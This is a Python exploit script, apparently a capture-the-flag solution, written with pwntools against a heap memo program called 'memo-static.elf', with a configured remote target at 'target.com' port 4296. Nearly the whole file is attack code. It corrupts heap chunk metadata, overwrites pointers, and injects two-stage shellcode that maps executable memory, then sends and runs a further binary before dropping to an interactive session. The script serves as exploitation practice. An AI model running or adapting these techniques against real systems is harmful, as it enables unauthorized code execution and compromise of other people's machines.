#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = '../bin/memo-static.elf'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'target.com', 'port':4296})
env.select('debug')

#==========

binf = ELF(bin_file)

addr_heap       = 0x605000

addr_memo       = binf.symbols['memo']
addr_memo_buf   = 0x7ffff7ff9000

addr_stack      = 0x7fffffffda80

#==========

def attack(conn):
    memo = Memo(conn)

    shellcode2  = shellcraft.mmap_rwx(0x2000)
    shellcode2 += shellcraft.read(0, 'rax', 0x2000)
    shellcode2 += '''
    add rsi, 0x150
    jmp rsi
    '''
    shellcode2  = asm(shellcode2)

    shellcode1  = 'lea rsi, [rip]'
    shellcode1 += shellcraft.read(0, None, len(shellcode2)+0x10)
    shellcode1  = asm(shellcode1)

    memo.alloc('a'*0x28)            # 0
    memo.alloc('b')                 # 1
    memo.alloc('c'*0x8+p64(0x31)+p64(addr_memo_buf+0x10-8)+p64(addr_memo_buf+0x10)) # 2
    memo.alloc(p64(0x30)+p64(0x20)) # 3
    memo.alloc(shellcode1)          # 4
    memo.alloc(p64(0xdeadbeef)+p64(0)+p64(addr_stack-0x8)+p64(0))                   # 5

    memo.edit(0, 'A'*0x28+chr(0x41))
    memo.delete(1)

    memo.alloc('b')                 # 1
    memo.edit(2, p64(addr_memo+1)[:len(p64(addr_heap).rstrip('\x00'))])
    memo.edit(1, p64(addr_heap + 0x1100)[1:len(p64(addr_memo_buf).rstrip('\x00'))])
    memo.edit(2, p64(addr_heap + 0x10e0))

    conn.send('\x90'*0x10 + shellcode2)
    conn.send(open('exploit.elf').read())
    
class Memo:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def alloc(self, data):
        self.sendlineafter('> ', '1')
        self.sendafter('memo > ', data)

    def edit(self, idx, data):
        self.sendlineafter('> ', '2')
        self.sendlineafter('id > ', str(idx))
        self.sendafter('memo > ', data)

    def delete(self, idx):
        self.sendlineafter('> ', '3')
        self.sendlineafter('id > ', str(idx))

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()

#==========
